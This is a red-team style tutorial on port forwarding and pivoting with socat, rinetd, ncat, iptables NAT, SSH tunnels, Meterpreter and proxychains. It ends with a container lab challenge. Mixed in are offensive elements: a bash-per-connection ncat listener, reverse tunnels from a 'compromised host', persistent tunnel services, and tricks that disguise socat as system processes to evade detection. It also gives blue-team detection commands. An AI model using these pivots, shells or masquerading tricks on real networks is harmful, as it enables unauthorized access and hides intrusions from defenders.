Port Forwarding

Redirecting TCP and UDP connections from one socket to another - socat, rinetd, iptables NAT , SSH , chaining, and persistence techniques for relay-based access.

Overview

Port forwarding moves bytes between two sockets: a connection arrives at one port and is replayed out another. This article covers the relay tools (socat, rinetd, ncat, 3proxy), kernel-level NAT with iptables, SSH -L and -R forwards, multi-hop chains, and how to keep a forward alive. After reading you can expose an internal service through a jump host and explain how each hop resolves the connection.

Required Reading

  • TCP Handshake - TCP three-way handshake, sequence numbers, connection lifecycle
  • Processes - process I/O, file descriptors, fork/exec, /proc/PID/fd
  • Authentication - credential types, SSH key formats, agent forwarding
  • Networking - IP addressing, routing tables, iptables chains and tables

The Relay Mindset

Port forwarding is the simplest pivot primitive: a TCP connection arrives at socket A, and the bytes are replayed out socket B. No encapsulation, no protocol wrapping - just a raw byte stream moved between two sockets. This makes port forwarding fast (no encoding overhead) but detectable (the protocol at the destination is the protocol seen at the relay).

Every port forward is defined by four parameters:

┌──────────────┐       ┌──────────────┐       ┌──────────────┐
│ Source Host  │──────►│ Relay Host   │──────►│ Target Host  │
│ connects to  │       │ listens on   │       │ final dest   │
│ relay:P_LIST │       │ P_LIST       │       │ T_HOST:T_PORT│
└──────────────┘       └──────────────┘       └──────────────┘
  • P_LIST : The port the relay listens on (the "inbound" side)
  • T_HOST:T_PORT : The destination address:port (the "outbound" side)
  • Transport : TCP or UDP
  • Mode : Fork (handle concurrent connections) or single-shot

socat - The Universal Relay

socat connects two bidirectional byte streams. Unlike netcat (which connects STDIN/STDOUT to a single socket), socat connects two arbitrary endpoints - sockets, files, pipes, exec'd processes, SSL sessions, proxies, TUN interfaces.

The core syntax: socat ENDPOINT_A ENDPOINT_B . Data flows bidirectionally between them.

Basic TCP Forwarding

# Forward localhost:4444 to remote-host:80
# fork: handle multiple connections (without fork, socat exits after first disconnect)
# reuseaddr: allow immediate rebind after shutdown (avoids TIME_WAIT)
socat TCP4-LISTEN:4444,fork,reuseaddr TCP4:remote-host.example.com:80

# Test:
curl http://localhost:4444          # Reaches remote-host:80

# Bind to specific interface:
socat TCP4-LISTEN:4444,bind=10.0.0.100,fork,reuseaddr TCP4:10.0.1.50:22

# Limit concurrent connections:
socat TCP4-LISTEN:4444,fork,reuseaddr,max-children=5 TCP4:target:80

Reverse Direction - Connect-Back Relay

When the target can reach the relay but the relay cannot directly reach the target (egress filtering), invert the direction. The target makes the outbound connection; socat bridges it to a local listener. 

# On relay host — listen for target's connect-back:
socat TCP4-LISTEN:5555,fork,reuseaddr TCP4-LISTEN:4444,fork,reuseaddr
# Wait... target connects to relay:5555. Now port 4444 is bridged to target.

# On target host (behind restrictive egress):
socat TCP4:relay.example.com:5555 TCP4:localhost:80
# Any connection to relay:4444 now reaches target:80

This is the "poor man's reverse tunnel" - no SSH required.

socat with SSL/TLS

# Generate cert (one-liner):
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/CN=relay" -keyout relay.key -out relay.crt

# Server — TLS-wrapped forwarder:
socat OPENSSL-LISTEN:443,cert=relay.crt,key=relay.key,verify=0,fork,reuseaddr \
      TCP4:localhost:80

# Client — connect via TLS and expose as local port:
socat TCP4-LISTEN:8080,fork,reuseaddr \
      OPENSSL:relay.example.com:443,verify=0
curl http://localhost:8080   # → TLS → relay:443 → localhost:80

# Verify server certificate (no verify=0):
socat TCP4-LISTEN:8080,fork,reuseaddr \
      OPENSSL:relay.example.com:443,cafile=ca.crt,commonname=relay

UDP Forwarding

# Forward UDP port 53 (DNS) to another DNS server:
socat UDP4-LISTEN:53,fork,reuseaddr UDP4:8.8.8.8:53

# TCP-to-UDP bridge (TCP client → UDP server):
socat TCP4-LISTEN:5353,fork,reuseaddr UDP4:dns-server:53

# UDP-to-TCP bridge (UDP client → TCP server):
socat UDP4-LISTEN:5353,fork,reuseaddr TCP4:dns-over-tls:853

Exec-Based Relays

socat can fork a process and connect its STDIN/STDOUT. This enables command forwarding without a shell. 

# Execute a command on connection (like inetd):
socat TCP4-LISTEN:2323,fork,reuseaddr EXEC:/usr/bin/whoami

# Forward incoming connection to an SSH session:
socat TCP4-LISTEN:2222,fork,reuseaddr \
      EXEC:'ssh -o StrictHostKeyChecking=no operator@target.internal',pty,ctty

# Named pipe relay (for IPC between containers):
mkfifo /tmp/relay_pipe
socat TCP4-LISTEN:4444,fork,reuseaddr PIPE:/tmp/relay_pipe &
socat PIPE:/tmp/relay_pipe TCP4:target:22 &

Proxy-Aware Forwarding

# Forward through HTTP CONNECT proxy:
socat TCP4-LISTEN:4444,fork,reuseaddr \
      PROXY:proxy.corp.com:target.internal:443,proxyport=8080

# Forward through SOCKS5 proxy:
socat TCP4-LISTEN:4444,fork,reuseaddr \
      SOCKS5:127.0.0.1:target.internal:443,socksport=1080

# Forward with proxy authentication:
socat TCP4-LISTEN:4444,fork,reuseaddr \
      PROXY:proxy.corp.com:target:443,proxyport=8080,proxyauth=user:password

Logging and Debugging

# Log all forwarded traffic to file (forensic trail):
socat -v TCP4-LISTEN:4444,fork,reuseaddr TCP4:target:80
# -v: verbose — hex+ASCII dump of all data to STDERR

# Log to separate file:
socat -x TCP4-LISTEN:4444,fork,reuseaddr TCP4:target:80 2>/var/log/socat.log
# -x: hex dump only (no ASCII)

# tee-like split: forward AND log to file:
socat TCP4-LISTEN:4444,fork,reuseaddr \
      SYSTEM:'tee /tmp/forwarded.bin | socat - TCP4:target:80'

rinetd - Simple, Reliable TCP Redirector

rinetd is a single-purpose TCP redirector. No TLS , no UDP , no scripting - just config-driven TCP forwarding. It's useful when you need a persistent, resource-light relay without socat's complexity. 

# Install:
pacman -S rinetd   # ArchLinux

# Configuration: /etc/rinetd.conf
# Format: bindaddress bindport connectaddress connectport
cat > /etc/rinetd.conf << 'EOF'
# Forward 0.0.0.0:8080 to internal web server
0.0.0.0  8080  192.168.100.10  80

# Forward localhost:3389 to domain controller
127.0.0.1  3389  10.0.0.10  3389

# Forward only from specific source IP:
10.0.0.100  443  172.16.0.5  443

# Logging:
# logfile /var/log/rinetd.log
# logcommon (logs all connections)
EOF

# Start rinetd:
sudo rinetd -f -c /etc/rinetd.conf
# -f: foreground (for debugging)
# Without -f: daemonizes

# Verify forwarding:
ss -tlnp | grep rinetd
curl http://localhost:8080

rinetd handles concurrent connections natively (no fork parameter needed). It's a single-process, single-thread event-driven redirector - very efficient.

ncat - OpenBSD netcat Extended

ncat (from the nmap project) extends traditional netcat with SSL , exec, brokering, and access control. 

# Install:
pacman -S nmap   # Includes ncat

# Basic TCP forwarding (acts as relay between two connections):
ncat -l -k -p 4444 -c 'ncat target.internal 80'
# -l: listen
# -k: keep listening after client disconnects (like socat fork)
# -c: execute command, connect its STDIO to the client

# SSL port forward:
ncat --ssl -l -k -p 4444 -c 'ncat target.internal 80'
ncat --ssl relay.example.com 4444

# Allow only specific source IP:
ncat -l -k -p 4444 --allow 10.0.0.0/24 -c 'ncat target.internal 80'

# Allow multiple sources:
ncat -l -k -p 4444 --allow 10.0.0.5 --allow 10.0.0.6

# Connection brokering — connect two listeners together:
ncat -l -k -p 4444 --broker
# Connect two clients to port 4444. Their streams are bridged.

# Execute shell per connection:
ncat -l -k -p 4444 --sh-exec '/bin/bash -i'

iptables NAT Port Forwarding

When the relay host is a router (multiple interfaces, IP forwarding enabled), iptables DNAT rules provide kernel-level port forwarding with no userspace process. This is faster than socat (kernel-space) but requires root and IP forwarding. 

# Enable IP forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward
# Persistent:
echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.d/99-redteam.conf
sysctl -p /etc/sysctl.d/99-redteam.conf

# DNAT: Redirect incoming TCP 8443 to internal host 192.168.1.100:443
iptables -t nat -A PREROUTING -p tcp --dport 8443 -j DNAT \
    --to-destination 192.168.1.100:443

# SNAT/MASQUERADE: Rewrite source address so return traffic comes back
# through the relay. Without this, the internal host tries to reply directly
# to the original source (which may be unreachable).
iptables -t nat -A POSTROUTING -p tcp -d 192.168.1.100 --dport 443 \
    -j MASQUERADE

# Verify:
iptables -t nat -L -n -v
curl https://relay-host:8443   # reaches internal:443

# Delete rules:
iptables -t nat -D PREROUTING -p tcp --dport 8443 -j DNAT \
    --to-destination 192.168.1.100:443
iptables -t nat -D POSTROUTING -p tcp -d 192.168.1.100 --dport 443 \
    -j MASQUERADE

Real-world iptables forward chain - relay accessible on eth0 (10.0.0.1), internal network on eth1 (192.168.1.0/24): 

# Forward RDP to internal host:
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 3389 \
    -j DNAT --to-destination 192.168.1.50:3389

# Forward multiple ports:
for port in 22 80 443 3389 8080; do
    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport $port \
        -j DNAT --to-destination 192.168.1.100:$port
done

# SNAT for all internal traffic:
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Verify routing works:
# On the service side (internal host), ensure default gateway is the relay:
# ip route add default via 192.168.1.1  (relay's internal IP)

SSH Port Forwarding in Practice

Refer to Tunneling for SSH tunnel fundamentals. Here we focus on tactical port forwarding usage.

Access Internal RDP Through SSH

# Attacker → jumphost (public IP) → internal DC (10.0.0.10:3389)
ssh -L 3389:10.0.0.10:3389 operator@jumphost.corp.com

# Connect RDP client to localhost:3389
xfreerdp /v:localhost:3389 /u:administrator /p:'Password123'

Access Internal Web Application

# Forward localhost:8080 to the internal wiki server:
ssh -L 8080:wiki.internal.corp.com:80 operator@jumphost.corp.com
# Browse to http://localhost:8080

# Forward multiple internal web apps:
ssh -L 8080:wiki.internal:80 \
    -L 9090:jenkins.internal:8080 \
    -L 3000:grafana.internal:3000 \
    operator@jumphost.corp.com

Make a Local Service Public

# On compromised host: expose internal web app (localhost:80) to
# your public server at port 8080:
ssh -R 8080:localhost:80 operator@public-server.example.com

# Double-hop: expose internal-server:22 through compromised host:
# On compromised host:
ssh -R 2222:internal-server.corp.com:22 operator@public-server.example.com
# Attacker then connects:
ssh -p 2222 localhost   # (after SSH-ing into public-server first)

SSH Forward via netcat

When the SSH server has AllowTcpForwarding no , bypass with raw netcat: 

# Start a netcat listener FORWARDING to the SSH server:
# On jumphost:
ncat -l -k -p 2323 -c 'ncat target.internal 22' &

# Then SSH through the local netcat relay:
ssh -p 2323 localhost
# ── OR ── SSH with ProxyCommand to use netcat:
ssh -o ProxyCommand='ncat localhost 2323' operator@target.internal

Port Forwarding Chains

Single-hop port forwarding is rarely sufficient. Real networks require multi-hop chains: A -> B -> C -> D. Each hop adds a relay. SSH -L creates each link. 

Attacker (A)               Relay 1 (B)             Relay 2 (C)            Target (D)
┌──────────┐  SSH -L  ┌──────────┐  SSH -L  ┌──────────┐  TCP    ┌──────────┐
│ :4444   ──0───────► :22       ──0───────► :22       ──0────► :80      │
└──────────┘          └──────────┘          └──────────┘         └──────────┘

Step-by-step chain construction

# Terminal 1: Relay B → Relay C (establishes hop B→C)
# On B:
ssh -L 5555:relay-c.corp.com:22 operator@relay-c.corp.com
# localhost:5555 on B now → relay-c:22

# Terminal 2: Relay A → Relay B (establishes hop A→B through B→C chain)
# On A:
ssh -L 4444:localhost:5555 operator@relay-b.corp.com
# Wait — this won't work because we need B's localhost:5555 to reach C

# CORRECT chain construction:
# Step 1 — On B: forward B:5555 → C:22
ssh -L 5555:relay-c.corp.com:22 operator@relay-c.corp.com

# Step 2 — On A: forward A:4444 → B:5555 → C:22
ssh -L 4444:localhost:5555 operator@relay-b.corp.com
# localhost:4444 on A → SSH → B:22 → B's localhost:5555 → C:22

# Step 3 — On A: SSH through the chain to C:
ssh -p 4444 localhost
# This lands on Relay C

# Step 4 — From C, forward to final target D:
ssh -L 8080:target-d.internal:80 operator@relay-c.corp.com
# Now from A: curl http://localhost:4444 (nested) or set up A's forwarding:
ssh -L 8081:localhost:8080 operator@relay-b.corp.com

Chain with socat

# On B: forward B:6666 → C:7777
socat TCP4-LISTEN:6666,fork,reuseaddr TCP4:relay-c.corp.com:7777 &
# On C: forward C:7777 → D:80
socat TCP4-LISTEN:7777,fork,reuseaddr TCP4:target-d.internal:80 &

# From A:
curl http://relay-b.corp.com:6666   # → B:6666 → C:7777 → D:80

# Chain verification — test each hop individually:
# On A:         ncat -v relay-b.corp.com 6666  (should time out or connect — check)
# On B:         ncat -v relay-c.corp.com 7777
# On C:         ncat -v target-d.internal 80
# If any hop fails, fix it before continuing.

3proxy - Proxy and Forwarder

3proxy is a tiny proxy server supporting SOCKS , HTTP , FTP proxy, and TCP / UDP port forwarding

  • all in one daemon.

# Install:
pacman -S 3proxy   # AUR

# Configuration: /etc/3proxy/3proxy.cfg
cat > /etc/3proxy/3proxy.cfg << 'EOF'
# Run as daemon
daemon

# SOCKS5 proxy on port 1080 (no auth)
socks -p1080

# HTTP proxy on port 3128
proxy -p3128

# TCP port forward: incoming :8080 → internal-web:80
tcppm -i0.0.0.0 8080 internal-web.corp.com 80

# TCP port forward: incoming :3389 → 10.0.0.50:3389
tcppm -i0.0.0.0 3389 10.0.0.50 3389

# Logging
log /var/log/3proxy.log D
logformat "L%d %H:%M:%S %C %U %R %E"
EOF

# Start:
sudo 3proxy /etc/3proxy/3proxy.cfg

# Verify:
ss -tlnp | grep -E '1080|3128|8080|3389'

Advantages of 3proxy over socat: Persistent daemon, single config file, built-in access control, logging. Use 3proxy when you need a multi-service relay that stays up through reboots.

Meterpreter Port Forwarding

When operating inside a Meterpreter session, portfwd provides built-in port forwarding: 

# Within msfconsole, after obtaining a Meterpreter session:
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.50
# -l: local port on attacker machine
# -p: target port on remote host
# -r: remote target IP (default: localhost of Meterpreter session)

# List active forwards:
meterpreter > portfwd list

# Remove a forward:
meterpreter > portfwd delete -l 3389

# Flush all forwards:
meterpreter > portfwd flush

# Forward to a different host through the compromised session:
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.100.10

SOCKS Plus Port Forwarding

SOCKS gives you reachability to a network. Port forwarding gives you a dedicated listener. Combine them through proxychains: 

# Step 1: Establish SOCKS proxy through pivot host
ssh -D 1080 operator@pivot.corp.com

# Step 2: Use proxychains to connect to a host in the internal network
# and set up port forwarding there
cat > /etc/proxychains4.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
EOF

# Step 3: Through the SOCKS proxy, SSH into an internal host and create a forward:
proxychains4 ssh -L 8443:internal-app:443 operator@internal-host.corp.com

# Now you have localhost:8443 → internal-app:443 through the chain:
#   SSH -L 8443 → internal-host → SOCKS → pivot → attacker

Dynamic vs Static Port Forwarding

Feature SSH -L (Static) SSH -D (Dynamic / SOCKS)
Target selection One target per forward Any target through the proxy
Protocol support TCP only TCP (SOCKS5)
Tool support Any TCP client SOCKS-aware tools or proxychains
Performance Slightly faster (dedicated stream) Per-connection setup overhead
Stealth Persistent connections visible Multiple short-lived connections
Use case One specific service (RDP, SSH, DB) General network exploration

Decision rule: Use -L for a known, long-lived service you need to interact with repeatedly ( RDP , SSH ). Use -D when exploring a network

  • you don't know which hosts and ports you'll need.

Maintaining Forwarded Ports

Port forwards die when the SSH session drops (network hiccup, server reboot, idle timeout). For persistent access, you need watchdog mechanisms.

autossh - Automatic SSH Tunnel Restart

# Install:
pacman -S autossh

# autossh wrapper: monitors the SSH connection and restarts it
# ServerAliveInterval: send keepalive every 30s
# ServerAliveCountMax: disconnect after 2 failed keepalives
# AUTOSSH_POLL: autossh's own monitor interval
autossh -M 0 \
    -o "ServerAliveInterval=30" \
    -o "ServerAliveCountMax=2" \
    -fNL 8080:internal-web:80 operator@jumphost.corp.com

# -M 0: disable autossh's monitoring port (use SSH keepalives instead)
# autossh runs the SSH command, monitors its exit, and restarts

# Verify autossh is running:
ps aux | grep autossh

systemd Unit for socat

# /etc/systemd/system/port-forward.service
[Unit]
Description=Persistent Port Forward: 4444 → 192.168.1.100:22
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/socat TCP4-LISTEN:4444,fork,reuseaddr TCP4:192.168.1.100:22
Restart=always
RestartSec=10
User=nobody
Group=nobody

[Install]
WantedBy=multi-user.target
						
sudo systemctl daemon-reload
sudo systemctl enable --now port-forward.service
sudo systemctl status port-forward.service

# Verify:
ss -tlnp | grep 4444
# Should show socat listening, owned by nobody

systemd Service for SSH Tunnel

# /etc/systemd/system/ssh-tunnel.service
[Unit]
Description=SSH Reverse Tunnel to public server
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/ssh -o "ServerAliveInterval=30" -o "ServerAliveCountMax=2" \
    -o "ExitOnForwardFailure=yes" \
    -NT -R 2222:localhost:22 tunnel-operator@public-server.example.com
Restart=always
RestartSec=30
User=tunnel-operator

[Install]
WantedBy=multi-user.target
						
# Create unprivileged user for tunneling:
sudo useradd -m -s /bin/false tunnel-operator

# Generate keypair for this user:
sudo -u tunnel-operator ssh-keygen -t ed25519 -N '' -f /home/tunnel-operator/.ssh/id_ed25519

# Add public key to public-server's authorized_keys:
sudo -u tunnel-operator cat /home/tunnel-operator/.ssh/id_ed25519.pub
# Append to public-server:~tunnel-operator/.ssh/authorized_keys

# Test then enable:
sudo systemctl start ssh-tunnel.service
sudo systemctl status ssh-tunnel.service
sudo systemctl enable ssh-tunnel.service

Port Forwarding Detection

Blue teams look for:

  1. Unexpected listening ports - ss -tlnp shows socat/rinetd processes on non-standard ports.
  1. Process genealogy - SSH process with -L or -R flags: ps aux | grep "ssh.*-L\|ssh.*-R"
  1. Connection tracking - ss -tnp showing connections that don't terminate at the local process but are forwarded elsewhere.
  1. Netstat anomalies - netstat -tulpn (deprecated, use ss) showing 0.0.0.0:PORT listeners owned by unexpected users.
# Blue team one-liner to find all port forwarders:
ss -tlnp | grep -vE 'sshd|nginx|apache|httpd|systemd|containerd|dockerd'

# Find SSH tunnels specifically:
ps aux | grep 'ssh.*-.*[LRD].*[0-9]' | grep -v grep

# Monitor established connections from relay processes:
ss -tnp state established | grep -E 'socat|rinetd|ncat|3proxy'

# Auditd rule for socat execution:
auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/socat \
    -k port-forward-socat

Evasion countermeasures:

# Rename the socat binary:
cp /usr/bin/socat /usr/lib/systemd/systemd-network
/usr/lib/systemd/systemd-network TCP4-LISTEN:4444,fork,reuseaddr TCP4:target:22 &

# Process name masking via exec -a:
exec -a [kworker/u8:2] socat TCP4-LISTEN:4444,fork,reuseaddr TCP4:target:22 &

# Or compile socat from source with a different name:
# git clone, modify Makefile CC lines to output 'systemd-logind'

Challenge

Access the internal web server and retrieve the flag from the attacker network using port forwarding on the jumpbox.

port-forwarding.Containerfile

The Containerfile builds a two-container lab:

  • jumpbox : dual-homed container connected to both attacker-net (10.89.0.0/24) and internal-net (10.89.1.0/24). Pre-installed with socat, rinetd, SSH server and client.
  • internal-server : connected only to internal-net . Runs nginx on port 80 and SSH on port 22. Contains a flag at /var/www/html/flag.txt .
# Build:
podman build -t portfwd-jumpbox -f port-forwarding.Containerfile --target jumpbox .
podman build -t portfwd-internal -f port-forwarding.Containerfile --target internal .

# Create networks:
podman network create attacker-net --subnet 10.89.0.0/24
podman network create internal-net --subnet 10.89.1.0/24 --internal

# Launch:
podman run -d --name jumpbox --network attacker-net --network internal-net \
    --cap-add NET_ADMIN portfwd-jumpbox
podman run -d --name internal-srv --network internal-net portfwd-internal

# Get IPs:
JUMPBOX_IP=$(podman inspect jumpbox --format '{{.NetworkSettings.Networks.attacker-net.IPAddress}}')
INTERNAL_IP=$(podman inspect internal-srv --format '{{.NetworkSettings.Networks.internal-net.IPAddress}}')

echo "Jumpbox attacker-side IP: $JUMPBOX_IP"
echo "Internal server IP: $INTERNAL_IP (only reachable from jumpbox)"

# Verify connectivity — direct to internal server should FAIL:
curl -s --connect-timeout 3 http://$INTERNAL_IP && echo "ERROR: direct access!" || echo "OK: internal is isolated"

# Exercise 1: socat port forward on jumpbox
# SSH into jumpbox: ssh root@$JUMPBOX_IP
# On jumpbox: socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:INTERNAL_IP:80 &
# From attacker: curl http://$JUMPBOX_IP:8080/flag.txt

# Exercise 2: rinetd approach
# Edit /etc/rinetd.conf, add: 0.0.0.0 9090 INTERNAL_IP 80
# Start rinetd, test: curl http://$JUMPBOX_IP:9090/flag.txt

# Exercise 3: iptables NAT
# iptables -t nat -A PREROUTING -p tcp --dport 7070 -j DNAT --to $INTERNAL_IP:80
# iptables -t nat -A POSTROUTING -j MASQUERADE
# echo 1 > /proc/sys/net/ipv4/ip_forward

# Cleanup:
podman stop jumpbox internal-srv && podman rm jumpbox internal-srv
podman network rm attacker-net internal-net
